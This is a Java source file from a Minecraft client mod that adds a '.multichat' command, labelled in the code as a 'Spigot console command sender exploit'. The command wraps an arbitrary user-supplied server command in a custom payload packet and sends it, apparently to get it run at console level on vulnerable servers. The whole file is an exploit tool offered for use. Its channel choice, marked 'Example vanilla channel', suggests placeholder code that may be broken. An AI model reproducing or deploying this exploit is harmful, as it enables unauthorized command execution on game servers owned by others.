package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.client.command.CommandManager;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.netty.buffer.Unpooled;

import static net.minecraft.client.command.CommandManager.literal;
import static net.minecraft.client.command.CommandManager.argument;

public class Multichat extends Command {

    public Multichat(MinecraftClient minecraftClient) {
        super("multichat", "Spigot console command sender exploit", minecraftClient);
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal(this.getName())
            .executes(this::onEmpty)
            .then(argument("command", StringArgumentType.greedyString())
                .executes(this::sendPayload))
        );
    }

    private int onEmpty(CommandContext<CommandSource> context) {
        Helper.printChatMessage("Usage: .multichat <command>");
        return 1;
    }

    private int sendPayload(CommandContext<CommandSource> context) {
        String command = context.getArgument("command", String.class);
        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());

        buf.writeString(command); // Payload

        Identifier channel = new Identifier("minecraft", "book_sign"); // Example vanilla channel
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(channel, buf);

        Helper.sendPacket(packet);
        Helper.printChatMessage("Payload sent!");
        return 1;
    }
}
